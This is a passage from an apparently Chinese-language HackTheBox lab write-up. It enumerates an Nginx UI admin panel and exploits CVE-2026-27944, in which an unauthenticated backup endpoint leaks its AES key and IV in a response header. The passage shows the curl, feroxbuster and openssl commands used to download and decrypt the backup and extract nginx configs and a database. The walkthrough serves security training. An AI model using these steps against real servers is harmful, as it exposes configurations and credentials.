+<p>查看报错界面：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# curl http://admin.snapped.htb/abcd -v</span><br><span class="line">*   Trying 10.129.45.91:80...</span><br><span class="line">* Connected to admin.snapped.htb (10.129.45.91) port 80 (#0)</span><br><span class="line">&gt; GET /abcd HTTP/1.1</span><br><span class="line">&gt; Host: admin.snapped.htb</span><br><span class="line">&gt; User-Agent: curl/7.88.1</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 404 Not Found</span><br><span class="line">&lt; Server: nginx/1.24.0 (Ubuntu)</span><br><span class="line">&lt; Date: Wed, 29 Apr 2026 08:31:57 GMT</span><br><span class="line">&lt; Content-Type: application/json; charset=utf-8</span><br><span class="line">&lt; Content-Length: 23</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; Request-Id: 9e11458a-5733-4f4e-8c88-d6d4dc8ab85f</span><br><span class="line">&lt; </span><br><span class="line">* Connection <span class="comment">#0 to host admin.snapped.htb left intact</span></span><br><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;not found&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回复了一个 JSON 格式的正文内容。</p>
+<p>值得注意的是，由于之前尝试过弱密码登入（admin:admin），Burp 中的 Site Map 就记录下来了对应的 API 信息：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260429163607823.png" alt="file-20260429163607823"></p>
+<p>在没有账号的前提下，无法对这个登入框有什么作为（SQL 测试之类的，在此处并不具备很高的优先级），因此决定采用目录枚举：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# feroxbuster -u http://admin.snapped.htb/</span><br><span class="line">                                                                                                                                                                                                                        </span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.13.1</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ http://admin.snapped.htb/</span><br><span class="line"> 🚩  In-Scope Url          │ admin.snapped.htb</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</span><br><span class="line"> 👌  Status Codes          │ All Status Codes!</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.13.1</span><br><span class="line"> 💉  Config File           │ /root/.config/feroxbuster/ferox-config.toml</span><br><span class="line"> 🔎  Extract Links         │ <span class="literal">true</span></span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔃  Recursion Depth       │ 4</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">404      GET        1l        2w       23c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">200      GET        9l       12w      243c http://admin.snapped.htb/browserconfig.xml</span><br><span class="line">200      GET       63l      116w     1316c http://admin.snapped.htb/manifest.json</span><br><span class="line">200      GET       30l      282w    11373c http://admin.snapped.htb/pwa-192x192.png</span><br><span class="line">200      GET        6l       17w     1344c http://admin.snapped.htb/favicon-32x32.png</span><br><span class="line">301      GET        0l        0w        0c http://admin.snapped.htb/assets =&gt; assets/</span><br><span class="line">404      GET      212l      423w    12987c http://admin.snapped.htb/assets/</span><br><span class="line">200      GET      106l      588w    50147c http://admin.snapped.htb/pwa-512x512.png</span><br><span class="line">200      GET       64l      142w    75487c http://admin.snapped.htb/favicon.ico</span><br><span class="line">200      GET        1l     8254w   308866c http://admin.snapped.htb/assets/index-Cjd4fVAL.css</span><br><span class="line">200      GET      624l    38187w  2050223c http://admin.snapped.htb/assets/index-DoHxQupa.js</span><br><span class="line">200      GET       50l      104w     1407c http://admin.snapped.htb/</span><br><span class="line">403      GET        1l        2w       34c http://admin.snapped.htb/mcp</span><br><span class="line">[####################] - 46s    60012/60012   0s      found:12      errors:0      </span><br><span class="line">[####################] - 45s    30000/30000   667/s   http://admin.snapped.htb/ </span><br><span class="line">[####################] - 45s    30000/30000   672/s   http://admin.snapped.htb/assets/ </span><br></pre></td></tr></table></figure>
+
+<p>在已知有 api 目录的前提下，可以对该目录进行补扫（因为上述扫描并没有看到这个目录）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# feroxbuster -u http://admin.snapped.htb/api</span><br><span class="line">                                                                                                                                                                                                                        </span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.13.1</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ http://admin.snapped.htb/api</span><br><span class="line"> 🚩  In-Scope Url          │ admin.snapped.htb</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</span><br><span class="line"> 👌  Status Codes          │ All Status Codes!</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.13.1</span><br><span class="line"> 💉  Config File           │ /root/.config/feroxbuster/ferox-config.toml</span><br><span class="line"> 🔎  Extract Links         │ <span class="literal">true</span></span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔃  Recursion Depth       │ 4</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">404      GET        1l        2w       23c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">403      GET        1l        2w       34c http://admin.snapped.htb/api/user</span><br><span class="line">403      GET        1l        2w       34c http://admin.snapped.htb/api/node</span><br><span class="line">403      GET        1l        2w       34c http://admin.snapped.htb/api/sites</span><br><span class="line">200      GET        1l        1w       29c http://admin.snapped.htb/api/install</span><br><span class="line">403      GET        1l        2w       34c http://admin.snapped.htb/api/config</span><br><span class="line">403      GET        1l        2w       34c http://admin.snapped.htb/api/users</span><br><span class="line">200      GET       77l      454w    33017c http://admin.snapped.htb/api/backup</span><br><span class="line">403      GET        1l        2w       34c http://admin.snapped.htb/api/events</span><br><span class="line">403      GET        1l        2w       34c http://admin.snapped.htb/api/settings</span><br><span class="line">403      GET        1l        2w       34c http://admin.snapped.htb/api/configs</span><br><span class="line">403      GET        1l        2w       34c http://admin.snapped.htb/api/certs</span><br><span class="line">403      GET        1l        2w       34c http://admin.snapped.htb/api/notifications</span><br><span class="line">403      GET        1l        2w       34c http://admin.snapped.htb/api/streams</span><br><span class="line">200      GET        1l        9w    52782c http://admin.snapped.htb/api/licenses</span><br><span class="line">403      GET        1l        2w       34c http://admin.snapped.htb/api/analytic</span><br><span class="line">403      GET        1l        2w       34c http://admin.snapped.htb/api/nodes</span><br><span class="line">[####################] - 45s    30002/30002   0s      found:16      errors:0      </span><br><span class="line">[####################] - 45s    30000/30000   667/s   http://admin.snapped.htb/api/</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>install</code></li>
+<li><code>backup</code></li>
+<li><code>licenses</code></li>
+</ul>
+<p>这三个的响应码显示 200。</p>
+<p>先看看 <code>install</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@htb:~# curl http://admin.snapped.htb/api/install -v</span><br><span class="line">*   Trying 10.129.45.91:80...</span><br><span class="line">* Connected to admin.snapped.htb (10.129.45.91) port 80 (#0)</span><br><span class="line">&gt; GET /api/install HTTP/1.1</span><br><span class="line">&gt; Host: admin.snapped.htb</span><br><span class="line">&gt; User-Agent: curl/7.88.1</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Server: nginx/1.24.0 (Ubuntu)</span><br><span class="line">&lt; Date: Wed, 29 Apr 2026 08:58:16 GMT</span><br><span class="line">&lt; Content-Type: application/json; charset=utf-8</span><br><span class="line">&lt; Content-Length: 29</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; Request-Id: 1e77b754-c5e9-4269-8708-096c549f7db2</span><br><span class="line">&lt; </span><br><span class="line">* Connection #0 to host admin.snapped.htb left intact</span><br><span class="line">&#123;&quot;lock&quot;:true,&quot;timeout&quot;:false&#125;</span><br></pre></td></tr></table></figure>
+
+<p>显示被锁住了。</p>
+<p>查看 <code>licenses</code>，能发现其中有大量的依赖信息已经对应的授权协议（licenses）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# curl http://admin.snapped.htb/api/licenses -s | jq . | <span class="built_in">head</span> -20</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;backend&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Go Programming Language&quot;</span>,</span><br><span class="line">      <span class="string">&quot;license&quot;</span>: <span class="string">&quot;BSD-3-Clause&quot;</span>,</span><br><span class="line">      <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://golang.org&quot;</span>,</span><br><span class="line">      <span class="string">&quot;version&quot;</span>: <span class="string">&quot;go1.25.5&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;gorm.io/gorm&quot;</span>,</span><br><span class="line">      <span class="string">&quot;license&quot;</span>: <span class="string">&quot;Unknown&quot;</span>,</span><br><span class="line">      <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://gorm.io/gorm&quot;</span>,</span><br><span class="line">      <span class="string">&quot;version&quot;</span>: <span class="string">&quot;v1.31.1&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;cloud.google.com/go/auth/oauth2adapt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;license&quot;</span>: <span class="string">&quot;Apache-2.0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://cloud.google.com/go/auth/oauth2adapt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;version&quot;</span>: <span class="string">&quot;v0.2.8&quot;</span></span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、backup"><a href="#五、backup" class="headerlink" title="五、backup"></a>五、backup</h2><p>尝试访问：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# curl http://admin.snapped.htb/api/backup</span><br><span class="line">Warning: Binary output can mess up your terminal. Use <span class="string">&quot;--output -&quot;</span> to tell </span><br><span class="line">Warning: curl to output it to your terminal anyway, or consider <span class="string">&quot;--output </span></span><br><span class="line"><span class="string">Warning: &lt;FILE&gt;&quot;</span> to save to a file.</span><br></pre></td></tr></table></figure>
+
+<p>看来会给我们一个文件，没有下载成功的原因是 <code>curl</code> 缺少了 <code>--output</code> 参数（通常简写为 <code>-o</code>），下载文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# curl -o backup http://admin.snapped.htb/api/backup</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 18354  100 18354    0     0  48495      0 --:--:-- --:--:-- --:--:-- 48427</span><br></pre></td></tr></table></figure>
+
+<p>查看文件类型：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# file backup </span><br><span class="line">backup: Zip archive data, at least v2.0 to extract, compression method=deflate</span><br></pre></td></tr></table></figure>
+
+<p>是一个压缩包，为了后续搞混，先将其重命名一下（加一个后缀）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@htb:~# mv backup backup.zip</span><br></pre></td></tr></table></figure>
+
+<p>解压：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# unzip backup.zip -d backup</span><br><span class="line">Archive:  backup.zip</span><br><span class="line">  inflating: backup/hash_info.txt    </span><br><span class="line">  inflating: backup/nginx-ui.zip     </span><br><span class="line">  inflating: backup/nginx.zip</span><br></pre></td></tr></table></figure>
+
+<p>进入 <code>backup</code> 目录，里面有三个文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# <span class="built_in">cd</span> backup</span><br><span class="line">root@htb:~/backup# <span class="built_in">ls</span></span><br><span class="line">hash_info.txt  nginx-ui.zip  nginx.zip</span><br></pre></td></tr></table></figure>
+
+<p>查看三个文件的类型：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup# file *</span><br><span class="line">hash_info.txt: data</span><br><span class="line">nginx-ui.zip:  data</span><br><span class="line">nginx.zip:     DOS executable (COM), start instruction 0xb8c85bbf ccfd9ffc</span><br></pre></td></tr></table></figure>
+
+<p>可以发现异常现象，明明应该是一个压缩包文件，却没有显示 Zip 字样，高度怀疑它们经过了加密、压缩封装或混淆处理。</p>
+<blockquote>
+<p>注意：Linux 中并不靠后缀来决定文件类型，但是上面说其异常的点在于命名格式与实际检测结果不匹配。</p>
+</blockquote>
+<p>这里顺带做个补充，file 的判断文件类型的逻辑主要靠 magic bytes，也就是文件开头的特征字节。</p>
+<p>正常 ZIP 文件开头通常是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">50 4b 03 04</span><br></pre></td></tr></table></figure>
+
+<p>也就是 ASCII 里的：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PK..</span><br></pre></td></tr></table></figure>
+
+<p>这里文件的开头 magic bytes：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup# xxd -l 32 nginx-ui.zip</span><br><span class="line">00000000: bdad dd14 e9a8 449d fd50 407b cd45 5b33  ......D..P@&#123;.E[3</span><br><span class="line">00000010: c465 fccf 73fd bd1a 4063 ff58 4cc1 c619  .e..s...@c.XL...</span><br></pre></td></tr></table></figure>
+
+<p>并不是正常的。</p>
+<p>从全局视角来看，这里如果检查一下 http 响应部分，说不定就直接自己把这个 CVE 给挖出来了……</p>
+<h2 id="六、CVE-2026-27944"><a href="#六、CVE-2026-27944" class="headerlink" title="六、CVE-2026-27944"></a>六、CVE-2026-27944</h2><p>到了熟悉的“找 CVE”环节，通过 Dork 语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nginx UI &quot;2.3.2&quot; cve backup</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260429181743141.png" alt="file-20260429181743141"></p>
+<p>大家可以发现，我在搜索内容中，添加了“backup”一词，这是上一步骤中我们卡住的部分，通过限定这个特殊词，能大幅度提升漏洞查找的精准度。</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260429182221246.png" alt="file-20260429182221246"></p>
+<p>我们之前的操作刚好就卡在第二步这里（这也是我为什么说“要是看个响应，说不定就自己挖出来了”）。</p>
+<p>重新下载压缩包（因为 CBC 模式下的 IV 每次并不相同）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# curl -o backup.zip http://admin.snapped.htb/api/backup -v</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 10.129.45.91:80...</span><br><span class="line">* Connected to admin.snapped.htb (10.129.45.91) port 80 (#0)</span><br><span class="line">&gt; GET /api/backup HTTP/1.1</span><br><span class="line">&gt; Host: admin.snapped.htb</span><br><span class="line">&gt; User-Agent: curl/7.88.1</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Server: nginx/1.24.0 (Ubuntu)</span><br><span class="line">&lt; Date: Wed, 29 Apr 2026 10:27:25 GMT</span><br><span class="line">&lt; Content-Type: application/zip</span><br><span class="line">&lt; Content-Length: 18354</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; Accept-Ranges: bytes</span><br><span class="line">&lt; Cache-Control: must-revalidate</span><br><span class="line">&lt; Content-Description: File Transfer</span><br><span class="line">&lt; Content-Disposition: attachment; filename=backup-20260429-062725.zip</span><br><span class="line">&lt; Content-Transfer-Encoding: binary</span><br><span class="line">&lt; Expires: 0</span><br><span class="line">&lt; Last-Modified: Wed, 29 Apr 2026 10:27:25 GMT</span><br><span class="line">&lt; Pragma: public</span><br><span class="line">&lt; Request-Id: 54536c03-4903-4b63-a56d-c015eb5a3441</span><br><span class="line">&lt; X-Backup-Security: qjhNvNsceSTvrkFKiTyshBYSmAXPOtXuOQTKjdZkcIA=:itB8QRRo9Q1+RRX+E6xByw==</span><br><span class="line">&lt; </span><br><span class="line">&#123; [12926 bytes data]</span><br><span class="line">100 18354  100 18354    0     0  80054      0 --:--:-- --:--:-- --:--:-- 79800</span><br><span class="line">* Connection <span class="comment">#0 to host admin.snapped.htb left intact</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>密钥：<code>qjhNvNsceSTvrkFKiTyshBYSmAXPOtXuOQTKjdZkcIA=</code></li>
+<li>IV：<code>itB8QRRo9Q1+RRX+E6xByw==</code></li>
+</ul>
+<p>解码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# <span class="built_in">echo</span> qjhNvNsceSTvrkFKiTyshBYSmAXPOtXuOQTKjdZkcIA= | <span class="built_in">base64</span> -d | xxd -p -c 0</span><br><span class="line">aa384dbcdb1c7924efae414a893cac8416129805cf3ad5ee3904ca8dd6647080</span><br><span class="line"></span><br><span class="line">root@htb:~# <span class="built_in">echo</span> itB8QRRo9Q1+RRX+E6xByw== | <span class="built_in">base64</span> -d | xxd -p -c 0</span><br><span class="line">8ad07c411468f50d7e4515fe13ac41cb</span><br></pre></td></tr></table></figure>
+
+<p>先解压下载下来的文件，并进入目录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# unzip backup.zip -d backup</span><br><span class="line">Archive:  backup.zip</span><br><span class="line">  inflating: backup/hash_info.txt    </span><br><span class="line">  inflating: backup/nginx-ui.zip     </span><br><span class="line">  inflating: backup/nginx.zip        </span><br><span class="line">root@htb:~# <span class="built_in">cd</span> backup</span><br></pre></td></tr></table></figure>
+
+<p>在目录中，还有一个文件之前没分析，那就是 <code>hash_info.txt</code>，通过 <code>cat</code> 查看发现是一堆乱码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup# cat hash_info.txt </span><br><span class="line">3򳢭Q[þR&quot;7V++Y񥑮ܧ~N±fC򺑻Z]֡~gެ鈙¹°ȉ񲝦ud7t闋fsQ	ڟ׶NJ­V|­ȏ@¤X‡𱴽s澞¤¬kԶ¢帐ړ8|n7</span><br><span class="line">º:(Qj핈㜝u¢D]¯u³dw#</span><br></pre></td></tr></table></figure>
+
+<p>应该也是经过加密了的，可以先拿它试试解密操作：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup# openssl enc -aes-256-cbc -d -<span class="keyword">in</span> hash_info.txt -out hash_info_dec.txt -K aa384dbcdb1c7924efae414a893cac8416129805cf3ad5ee3904ca8dd6647080 -iv 8ad07c411468f50d7e4515fe13ac41cb</span><br><span class="line"></span><br><span class="line">root@htb:~/backup# <span class="built_in">cat</span> hash_info_dec.txt</span><br><span class="line">nginx-ui_hash: 6460e4970376c07e9773ef57ab85c93aebb137ef944ce720753121c9af693d7b</span><br><span class="line">nginx_hash: 75deb0e951bb55d9866c155812e5cc60b611cdd947ae439b3114b56d50c8232b</span><br><span class="line">timestamp: 20260429-062725</span><br><span class="line">version: 2.3.2</span><br></pre></td></tr></table></figure>
+
+<p>成功恢复明文，说明 CVE 和思路都是对的。</p>
+<p>同理解密那两个压缩包：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup# openssl enc -aes-256-cbc -d -<span class="keyword">in</span> nginx-ui.zip -out nginx-ui-dec.zip -K aa384dbcdb1c7924efae414a893cac8416129805cf3ad5ee3904ca8dd6647080 -iv 8ad07c411468f50d7e4515fe13ac41cb</span><br><span class="line">root@htb:~/backup# openssl enc -aes-256-cbc -d -<span class="keyword">in</span> nginx.zip -out nginx-dec.zip -K aa384dbcdb1c7924efae414a893cac8416129805cf3ad5ee3904ca8dd6647080 -iv 8ad07c411468f50d7e4515fe13ac41cb</span><br></pre></td></tr></table></figure>
+
+<p>这样就获得两个解密后的压缩包了：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup# file nginx-ui-dec.zip </span><br><span class="line">nginx-ui-dec.zip: Zip archive data, at least v2.0 to extract, compression method=deflate</span><br><span class="line">root@htb:~/backup# file nginx-dec.zip </span><br><span class="line">nginx-dec.zip: Zip archive data, at least v2.0 to extract, compression method=store</span><br></pre></td></tr></table></figure>
+
+<p>解压：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup# unzip nginx-ui-dec.zip -d nginx-ui</span><br><span class="line">Archive:  nginx-ui-dec.zip</span><br><span class="line">  inflating: nginx-ui/app.ini        </span><br><span class="line">  inflating: nginx-ui/database.db    </span><br><span class="line">root@htb:~/backup# unzip nginx-dec.zip -d nginx</span><br><span class="line">Archive:  nginx-dec.zip</span><br><span class="line">   creating: nginx/conf.d/</span><br><span class="line">  inflating: nginx/fastcgi.conf      </span><br><span class="line">  inflating: nginx/fastcgi_params    </span><br><span class="line">  inflating: nginx/koi-utf           </span><br><span class="line">  inflating: nginx/koi-win           </span><br><span class="line">  inflating: nginx/mime.types        </span><br><span class="line">   creating: nginx/modules-available/</span><br><span class="line">   creating: nginx/modules-enabled/</span><br><span class="line">  inflating: nginx/nginx.conf        </span><br><span class="line">  inflating: nginx/proxy_params      </span><br><span class="line">  inflating: nginx/scgi_params       </span><br><span class="line">   creating: nginx/sites-available/</span><br><span class="line">  inflating: nginx/sites-available/nginx-ui  </span><br><span class="line">  inflating: nginx/sites-available/snapped  </span><br><span class="line">   creating: nginx/sites-enabled/</span><br><span class="line">  inflating: nginx/sites-enabled/nginx-ui  -&gt; /etc/nginx/sites-available/nginx-ui </span><br><span class="line">  inflating: nginx/sites-enabled/snapped  -&gt; /etc/nginx/sites-available/snapped </span><br><span class="line">   creating: nginx/snippets/</span><br><span class="line">  inflating: nginx/snippets/fastcgi-php.conf  </span><br><span class="line">  inflating: nginx/snippets/snakeoil.conf  </span><br><span class="line">  inflating: nginx/uwsgi_params      </span><br><span class="line">  inflating: nginx/win-utf           </span><br><span class="line">finishing deferred symbolic links:</span><br><span class="line">  nginx/sites-enabled/nginx-ui -&gt; /etc/nginx/sites-available/nginx-ui</span><br><span class="line">  nginx/sites-enabled/snapped -&gt; /etc/nginx/sites-available/snapped</span><br></pre></td></tr></table></figure>
+
+<h2 id="七、查看压缩包中的内容"><a href="#七、查看压缩包中的内容" class="headerlink" title="七、查看压缩包中的内容"></a>七、查看压缩包中的内容</h2><h3 id="1、nginx"><a href="#1、nginx" class="headerlink" title="1、nginx"></a>1、nginx</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup/nginx# <span class="built_in">ls</span> -l</span><br><span class="line">total 68</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr 29 10:27 conf.d</span><br><span class="line">-rw-r--r-- 1 root root 1125 Apr 29 10:27 fastcgi.conf</span><br><span class="line">-rw-r--r-- 1 root root 1055 Apr 29 10:27 fastcgi_params</span><br><span class="line">-rw-r--r-- 1 root root 2837 Apr 29 10:27 koi-utf</span><br><span class="line">-rw-r--r-- 1 root root 2223 Apr 29 10:27 koi-win</span><br><span class="line">-rw-r--r-- 1 root root 5465 Apr 29 10:27 mime.types</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr 29 10:27 modules-available</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr 29 10:27 modules-enabled</span><br><span class="line">-rw-r--r-- 1 root root 1483 Apr 29 10:27 nginx.conf</span><br><span class="line">-rw-r--r-- 1 root root  180 Apr 29 10:27 proxy_params</span><br><span class="line">-rw-r--r-- 1 root root  636 Apr 29 10:27 scgi_params</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr 29 10:27 sites-available</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr 29 10:27 sites-enabled</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr 29 10:27 snippets</span><br><span class="line">-rw-r--r-- 1 root root  664 Apr 29 10:27 uwsgi_params</span><br><span class="line">-rw-r--r-- 1 root root 3071 Apr 29 10:27 win-utf</span><br></pre></td></tr></table></figure>
+
+<p>查看 nginx 配置文件（<code>nginx.conf</code>）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup/nginx# <span class="built_in">cat</span> nginx.conf</span><br><span class="line">user www-data;</span><br><span class="line">worker_processes auto;</span><br><span class="line">pid /run/nginx.pid;</span><br><span class="line">error_log /var/log/nginx/error.log;</span><br><span class="line">include /etc/nginx/modules-enabled/*.conf;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">	worker_connections 768;</span><br><span class="line">	<span class="comment"># multi_accept on;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># Basic Settings</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line"></span><br><span class="line">	sendfile on;</span><br><span class="line">	tcp_nopush on;</span><br><span class="line">	types_hash_max_size 2048;</span><br><span class="line"></span><br><span class="line">	include /etc/nginx/mime.types;</span><br><span class="line">	default_type application/octet-stream;</span><br><span class="line"></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># SSL Settings</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line"></span><br><span class="line">	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; <span class="comment"># Dropping SSLv3, ref: POODLE</span></span><br><span class="line">	ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># Logging Settings</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line"></span><br><span class="line">	access_log /var/log/nginx/access.log;</span><br><span class="line">	error_log /var/log/nginx/error.log;</span><br><span class="line"></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># Gzip Settings</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line"></span><br><span class="line">	gzip on;</span><br><span class="line"></span><br><span class="line">	include /etc/nginx/conf.d/*.conf;</span><br><span class="line">	include /etc/nginx/sites-enabled/*;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重点关注其中被包含进来的文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">include /etc/nginx/modules-enabled/*.conf</span><br><span class="line">include /etc/nginx/mime.types;</span><br><span class="line">include /etc/nginx/conf.d/*.conf;</span><br><span class="line">include /etc/nginx/sites-enabled/*;</span><br></pre></td></tr></table></figure>
+
+<p>其中：</p>
+<ul>
+<li><code>mime.types</code> 和文件类型有关</li>
+<li><code>modules-enabled</code> 和 <code>conf.d</code> 这两个目录中并没有放内容</li>
+</ul>
+<p>因此，重心就放在了 <code>sites-enabled</code> 目录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup/nginx# <span class="built_in">ls</span> -l sites-enabled/</span><br><span class="line">total 0</span><br><span class="line">lrwxrwxrwx 1 root root 35 Apr 29 12:00 nginx-ui -&gt; /etc/nginx/sites-available/nginx-ui</span><br><span class="line">lrwxrwxrwx 1 root root 34 Apr 29 12:00 snapped -&gt; /etc/nginx/sites-available/snapped</span><br></pre></td></tr></table></figure>
+
